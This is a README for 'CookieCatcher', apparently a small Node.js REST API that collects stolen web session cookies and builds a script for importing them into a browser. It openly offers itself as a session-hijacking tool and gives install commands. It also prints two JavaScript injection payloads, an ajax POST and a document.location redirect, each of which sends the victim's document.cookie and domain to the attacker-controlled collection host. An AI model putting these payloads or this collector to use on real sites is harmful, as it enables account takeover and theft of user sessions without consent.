# CookieCatcher (version. 0.0.1)
This is a mini and simple API REST for management of Web sessions that were hijacked.

### Features (that is simple)
- Capture request through GET or POST (method)
- Parse to cookies format
- Create script to import into your browser

### How to install this little devil?
```sh
$ git https://github.com/JavaGarcia/CookieCatcher.git
$ cd CookieCatcher
$ npm install
$ sudo DEBUG=APIcookies:* ./bin/www
```

### Scheme to send requests
Example with ajax (POST or GET)
```javascript
$.ajax({
        type: "POST",//or GET
        url: "http://cookieCatcher/session",//obviously change (cookieCatcher).
        data:"domain="+document.domain+"&cookie="+document.cookie,
        success: function(datos){/*if you want to show something.*/}
});
```
Normal request GET (redirect)
```javascript
document.location.href="http://cookieCatcher/session/"+document.domain+"/"+document.cookie;
```

#### Made with love in Colombia.
# License:

CookieCatcher is licensed under the GPLv3: http://www.gnu.org/licenses/gpl-3.0.html. 

